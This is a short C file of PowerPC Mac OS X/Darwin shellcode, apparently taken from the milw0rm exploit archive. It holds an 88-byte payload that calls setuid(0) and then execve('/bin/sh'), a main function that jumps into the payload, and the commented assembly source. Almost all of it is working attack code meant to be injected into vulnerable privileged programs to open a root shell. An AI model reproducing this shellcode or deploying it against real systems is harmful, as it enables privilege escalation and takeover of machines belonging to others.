/*
PPC OSX/Darwin Shellcode by B-r00t. 2003.
Does setuid(0); execve(/bin/sh); exit(0);
See ASM below.
88 Bytes.
*/
char shellcode[] =
"\x7c\x63\x1a\x79\x40\x82\xff\xfd"
"\x7d\x68\x02\xa6\x3b\xeb\x01\x70"
"\x39\x40\x01\x70\x39\x1f\xfe\xdf"
"\x7c\x68\x19\xae\x38\x0a\xfe\xa7"
"\x44\xff\xff\x02\x60\x60\x60\x60"
"\x7c\xa5\x2a\x79\x38\x7f\xfe\xd8"
"\x90\x61\xff\xf8\x90\xa1\xff\xfc"
"\x38\x81\xff\xf8\x38\x0a\xfe\xcb"
"\x44\xff\xff\x02\x7c\xa3\x2b\x78"
"\x38\x0a\xfe\x91\x44\xff\xff\x02"
"\x2f\x62\x69\x6e\x2f\x73\x68\x58";

int main (void)
{
        __asm__("b _shellcode");
}


/*
; PPC OS X / Darwin Shellcode by B-r00t.
; setuid(0) execve(/bin/sh) exit(0)
;
.globl _main
.text
_main:
        xor.    r3, r3, r3
        bnel    _main
        mflr    r11
        addi    r31, r11, 368
        li      r10, 368
        addi    r8, r31, -289
        stbx    r3, r8, r3
        addi    r0, r10, -345
        .long   0x44ffff02
        .long   0x60606060
        xor.    r5, r5, r5
        addi    r3, r31, -296
        stw     r3, -8(r1)
        stw     r5, -4(r1)
        subi    r4, r1, 8
        addi    r0, r10, -309
        .long   0x44ffff02
        mr      r3, r5
        addi    r0, r10, -367
        .long   0x44ffff02
path:   .asciz  "/bin/shX"

*/

// milw0rm.com [2004-09-26]